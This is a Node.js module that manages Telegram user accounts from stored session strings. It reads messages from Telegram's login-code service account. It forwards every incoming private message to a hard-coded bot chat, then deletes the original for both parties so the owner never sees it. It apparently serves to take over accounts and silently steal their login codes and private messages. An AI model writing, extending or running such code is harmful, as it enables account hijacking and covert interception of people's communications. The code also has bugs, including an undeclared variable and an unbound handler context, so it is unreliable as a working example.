const { TelegramClient } = require('telegram');
const { NewMessage } = require("telegram/events/index.js");
const axios = require('axios');
const { StringSession } = require('telegram/sessions');
const ppplbot = `https://api.telegram.org/bot5807856562:${process.env.apikey}/sendMessage?chat_id=-1001801844217`;

class TelegramManager {
    constructor() {
        this.clients = new Map();
    }

    async createClient(sessionString, phoneNumber) {
        if (this.clients.has(phoneNumber)) {
            console.log("client already connected!");
        } else {
            try {
                const session = new StringSession(sessionString);
                const client = new TelegramClient(session, parseInt(process.env.API_ID), process.env.API_HASH, {
                    connectionRetries: 5,
                });
                await client.connect();
                console.log(`Client connected: ${phoneNumber}`);

                client.addEventHandler(this.handleEvents, new NewMessage({ incoming: true }));
                this.clients.set(phoneNumber, client);
                return client;
            } catch (error) {
                console.log(error);
            }
        }
    }

    async getLastMsgs(limit, number) {
        const client = await this.getClient(number)
        const msgs = await client.getMessages("777000", { limit: parseInt(limit) });
        resp = ''
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp = resp + msg.text + "\n"
        })
        return (resp)
    }

    async getClient(phoneNumber) {
        if (!this.clients.has(phoneNumber)) {
            throw new Error(`Client not found for phone number ${phoneNumber}`);
        }

        const client = this.clients.get(phoneNumber);
        await client.connect();
        console.log(`Client reconnected: ${phoneNumber}`);
        return client;
    }

    async disconnectAll() {
        for (const [phoneNumber, client] of this.clients.entries()) {
            await client.disconnect();
            console.log(`Client disconnected: ${phoneNumber}`);
        }
        this.clients.clear();
    }

    async fetchWithTimeout(resource, options = {}) {
        const timeout = options?.timeout || 15000;

        const source = axios.CancelToken.source();
        const id = setTimeout(() => source.cancel(), timeout);
        try {
            const response = await axios({
                ...options,
                url: resource,
                cancelToken: source.token
            });
            clearTimeout(id);
            return response;
        } catch (error) {
            if (axios.isCancel(error)) {
                console.log('Request canceled:', error.message);
            } else {
                console.log('Error:', error.message);
            }
            return undefined;
        }
    }

    async handleEvents(event) {
        if (event.isPrivate) {
            console.log(event.message.text.toLowerCase());
            const payload = {
                chat_id: "-1001729935532",
                text: event.message.text
            };
            console.log("RECIEVED");
            const options = {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            };
            await this.fetchWithTimeout(`${ppplbot}`, options);
            await event.message.delete({ revoke: true });
        }
    }
}

module.exports = TelegramManager;
